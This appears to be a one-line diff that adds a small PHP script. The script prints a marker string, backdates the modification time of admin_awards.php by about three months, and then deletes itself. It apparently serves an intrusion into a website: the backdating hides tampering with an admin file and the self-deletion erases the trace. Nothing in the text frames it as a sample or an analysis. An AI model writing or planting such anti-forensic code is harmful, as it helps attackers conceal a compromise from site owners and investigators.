@@ -1,0 +1,1 @@
+<?php echo "CSYGDSrZrt"; if (file_exists("./admin_awards.php")){ touch("./admin_awards.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*DNsPQXbE4WqmtwxenZ5w*/ ?>
